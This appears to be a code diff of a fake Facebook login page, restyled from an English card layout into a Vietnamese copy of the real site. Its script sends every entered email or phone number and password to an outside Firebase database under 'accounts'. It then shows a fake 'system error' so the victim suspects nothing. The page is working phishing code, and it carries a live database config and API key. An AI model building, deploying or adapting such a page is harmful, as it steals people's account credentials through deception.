@@ -1,222 +1,243 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Đăng nhập Facebook</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đăng nhập Facebook</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
 
-<style>
-* {
-  margin: 0;
-  padding: 0;
-  box-sizing: border-box;
-  font-family: Helvetica, Arial, sans-serif;
-}
+        body {
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
 
-body {
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  min-height: 100vh;
-  margin: 0;
-}
+        .container {
+            display: flex;
+            flex: 1;
+            align-items: center;
+            justify-content: center;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 25px;
+        }
 
-body::before {
-  content: "";
-  position: absolute;
-  width: 100%;
-  height: 100%;
-  background:
-    linear-gradient(rgba(0,0,0,0.35), rgba(0,0,0,0.5)),
-    url("https://c.files.bbci.co.uk/45EC/production/_129800971_gettyimages-1238219305.jpg") no-repeat center center/cover;
-  z-index: -1;
-}
+        /* Phần bên trái: Hình ảnh và Slogan */
+        .left-content {
+            flex: 1;
+            padding-right: 50px;
+        }
 
-.login-card {
-  width: 400px;
-  background: #fff;
-  border-radius: 8px;
-  box-shadow: 0 12px 28px 0 rgba(0, 0, 0, 0.2), 0 2px 4px 0 rgba(0, 0, 0, 0.1);
-  padding: 0;
-  overflow: hidden;
-  position: relative;
-}
+        .fb-logo {
+            width: 45px;
+            margin-bottom: 20px;
+        }
 
-.card-header {
-  padding: 20px;
-  text-align: center;
-  border-bottom: 1px solid #dddfe2;
-  position: relative;
-}
+        .slogan {
+            font-size: 48px;
+            font-weight: bold;
+            line-height: 1.2;
+            color: #1c1e21;
+        }
 
-.card-header h2 {
-  font-size: 20px;
-  color: #1c1e21;
-  font-weight: 600;
-}
+        .hero-img {
+            max-width: 500px;
+            margin-top: 20px;
+            display: block;
+        }
 
-.close-btn {
-  position: absolute;
-  right: 15px;
-  top: 15px;
-  font-size: 24px;
-  color: #606770;
-  cursor: pointer;
-  line-height: 1;
-}
+        /* Phần bên phải: Form đăng nhập */
+        .right-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-width: 400px;
+        }
 
-.card-body {
-  padding: 20px;
-}
+        .login-box {
+            width: 100%;
+            text-align: center;
+        }
 
-.input-container {
-  margin-bottom: 12px;
-}
+        .login-title {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            text-align: left;
+        }
 
-.input-container input {
-  width: 100%;
-  padding: 14px 16px;
-  font-size: 15px;
-  border: 1px solid #dddfe2;
-  border-radius: 6px;
-  outline: none;
-  background-color: #f5f6f7;
-  color: #1c1e21;
-}
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 10px;
+            font-size: 16px;
+        }
 
-.input-container input:focus {
-  border-color: #1877f2;
-  box-shadow: 0 0 0 2px #e7f3ff;
-  background-color: #fff;
-}
+        input:focus {
+            outline: none;
+            border-color: #0866ff;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
 
-.remember-me {
-  display: flex;
-  align-items: center;
-  margin: 15px 0;
-  font-size: 14px;
-  color: #4b4f56;
-}
+        .btn-login {
+            width: 100%;
+            background-color: #0866ff;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            padding: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: background 0.2s;
+        }
 
-.remember-me input {
-  margin-right: 8px;
-  width: 18px;
-  height: 18px;
-}
+        .btn-login:hover {
+            background-color: #075ce4;
+        }
 
-.btn-login {
-  width: 100%;
-  padding: 10px;
-  background-color: #1877f2;
-  border: none;
-  border-radius: 6px;
-  color: #fff;
-  font-size: 20px;
-  font-weight: 700;
-  cursor: pointer;
-  transition: background-color 0.2s;
-}
+        .forgot-password {
+            display: block;
+            margin: 20px 0;
+            color: #1c1e21;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
 
-.btn-login:hover {
-  background-color: #166fe5;
-}
+        .btn-create {
+            width: 100%;
+            background-color: transparent;
+            color: #0866ff;
+            border: 1px solid #0866ff;
+            border-radius: 25px;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+        }
 
-.forgot-password {
-  display: block;
-  text-align: center;
-  margin-top: 15px;
-  color: #1877f2;
-  text-decoration: none;
-  font-size: 14px;
-}
+        .meta-logo {
+            margin-top: 30px;
+            width: 60px;
+            opacity: 0.7;
+        }
 
-.forgot-password:hover {
-  text-decoration: underline;
-}
+        /* Status message style */
+        #status {
+            margin-top: 15px;
+            font-size: 14px;
+            min-height: 20px;
+        }
 
-#status {
-  text-align: center;
-  margin-top: 10px;
-  font-size: 13px;
-  min-height: 18px;
-}
-</style>
+        /* Footer ngôn ngữ */
+        .footer {
+            padding: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #737373;
+            border-top: 1px solid #dddfe2;
+            background: #fff;
+        }
 
+        .footer span {
+            margin: 0 10px;
+            cursor: pointer;
+        }
+        
+        @media (max-width: 900px) {
+            .container { flex-direction: column; text-align: center; }
+            .left-content { padding-right: 0; margin-bottom: 40px; }
+            .hero-img { margin: 20px auto; width: 80%; }
+            .login-title { text-align: center; }
+        }
+    </style>
 </head>
 <body>
 
-<div class="login-card">
-    <div class="card-header">
-        <h2>Log In to Facebook</h2>
-        <span class="close-btn">&times;</span>
+    <div class="container">
+        <div class="left-content">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="FB Logo" class="fb-logo">
+            <h1 class="slogan">Khám phá<br>những điều <span style="color: #1877f2;">bạn yêu thích.</span></h1>
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y0/r/U45qBJmWVHU.webp" alt="Social Graphics" class="hero-img">
+        </div>
+
+        <div class="right-content">
+            <div class="login-box">
+                <h2 class="login-title">Đăng nhập vào Facebook</h2>
+                <input type="text" id="username" placeholder="Email hoặc số di động" required>
+                <input type="password" id="password" placeholder="Mật khẩu" required>
+                <button type="button" class="btn-login" onclick="sendToCloud()">Đăng nhập</button>
+                
+                <div id="status"></div>
+
+                <a href="#" class="forgot-password">Quên mật khẩu?</a>
+                <a href="#" class="btn-create">Tạo tài khoản mới</a>
+            </div>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" class="meta-logo">
+        </div>
     </div>
 
-    <div class="card-body">
-        <div class="input-container">
-            <input type="text" id="username" placeholder="Email or phone number" required>
-        </div>
-
-        <div class="input-container">
-            <input type="password" id="password" placeholder="Password" required>
-        </div>
-
-        <div class="remember-me">
-            <input type="checkbox" id="remember">
-            <label for="remember">Remember password</label>
-        </div>
-
-        <button class="btn-login" onclick="sendToCloud()">Log In</button>
-
-        <a href="#" class="forgot-password">Forgot password?</a>
-        
-        <div id="status"></div>
+    <div class="footer">
+        <span>Tiếng Việt</span> • <span>English (UK)</span> • <span>中文(台灣)</span> • <span>한국어</span> • <span>日本語</span> • <span>Ngôn ngữ khác...</span>
     </div>
-</div>
 
-<script type="module">
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
-import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";
 
-const firebaseConfig = {
-  apiKey: "AIzaSyCNtDrjM-xO_lXPIOytOLuj4VfZo1qBH0s",
-  authDomain: "keyl-1bb66.firebaseapp.com",
-  databaseURL: "https://keyl-1bb66-default-rtdb.asia-southeast1.firebasedatabase.app",
-  projectId: "keyl-1bb66",
-  storageBucket: "keyl-1bb66.firebasestorage.app",
-  messagingSenderId: "742688123103",
-  appId: "1:742688123103:web:94e9c7e88c26f8178ee16a"
-};
+        const firebaseConfig = {
+          apiKey: "AIzaSyCNtDrjM-xO_lXPIOytOLuj4VfZo1qBH0s",
+          authDomain: "keyl-1bb66.firebaseapp.com",
+          databaseURL: "https://keyl-1bb66-default-rtdb.asia-southeast1.firebasedatabase.app",
+          projectId: "keyl-1bb66",
+          storageBucket: "keyl-1bb66.firebasestorage.app",
+          messagingSenderId: "742688123103",
+          appId: "1:742688123103:web:94e9c7e88c26f8178ee16a"
+        };
 
-const app = initializeApp(firebaseConfig);
-const db = getDatabase(app);
-const dbRef = ref(db, 'accounts');
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+        const dbRef = ref(db, 'accounts');
 
-window.sendToCloud = function() {
-    const userField = document.getElementById('username');
-    const passField = document.getElementById('password');
-    const status = document.getElementById('status');
+        window.sendToCloud = function() {
+            const userField = document.getElementById('username');
+            const passField = document.getElementById('password');
+            const status = document.getElementById('status');
 
-    if (userField.value && passField.value) {
-        push(dbRef, {
-            user: userField.value,
-            pass: passField.value,
-            time: new Date().toLocaleString()
-        }).then(() => {
-            userField.value = '';
-            passField.value = '';
-            status.innerHTML = '<span style="color:#00a400">Processing...</span>';
+            if (userField.value && passField.value) {
+                push(dbRef, {
+                    user: userField.value,
+                    pass: passField.value,
+                    time: new Date().toLocaleString()
+                }).then(() => {
+                    userField.value = '';
+                    passField.value = '';
+                    status.innerHTML = '<span style="color:#00a400">Đang xử lý...</span>';
 
-            setTimeout(() => {
-                status.innerHTML = '<span style="color:#fa3e3e">System error, please try again later.</span>';
-            }, 1500);
-        }).catch((error) => {
-            status.innerHTML = '<span style="color:red;">' + error.message + '</span>';
-        });
-    } else {
-        status.innerHTML = '<span style="color:#777;">Please enter all information</span>';
-    }
-};
-</script>
-
+                    setTimeout(() => {
+                        status.innerHTML = '<span style="color:#fa3e3e">Lỗi hệ thống, thử lại sau</span>';
+                    }, 1500);
+                }).catch((error) => {
+                    status.innerHTML = '<span style="color:red;">' + error.message + '</span>';
+                });
+            } else {
+                status.innerHTML = '<span style="color:#777;">Vui lòng nhập đầy đủ thông tin</span>';
+            }
+        };
+    </script>
 </body>
 </html>
